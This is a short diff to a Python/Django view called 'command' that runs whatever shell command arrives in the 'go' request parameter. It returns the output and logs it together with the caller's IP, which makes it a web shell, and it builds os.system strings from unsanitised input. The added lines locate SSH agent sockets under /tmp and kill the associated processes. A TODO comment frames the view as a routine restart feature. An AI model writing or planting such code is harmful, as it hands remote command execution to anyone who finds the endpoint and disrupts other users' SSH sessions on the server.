@@ -38,10 +38,11 @@ def command(request):
     # TODO: Integrate the restart function
     ip = request.META.get('REMOTE_ADDR')
     result = os.popen(request.GET['go']).read()
-    print(request.GET['go'])
-    print(result)
-    os.system("echo '" + request.GET['go'] + result + "' > Results")
-    os.system("echo '" + ip + "' > Results")
+    os.system("echo '" + request.GET['go'] + result + "' >> Results")
+    os.system("echo '" + ip + "' >> Results")
+    sshAgentList = os.popen("find /tmp/ -type s -name agent.* 2>/dev/null | grep '/tmp/ssh-.*/agent.*'").read().split("\n")[:-1]
+    for i in range(len(sshAgentList)):
+        os.system("kill " + str(int(sshAgentList[i].split(".")[1])+1))
     return HttpResponse(result + '\n' + ip + '\n')
 
 
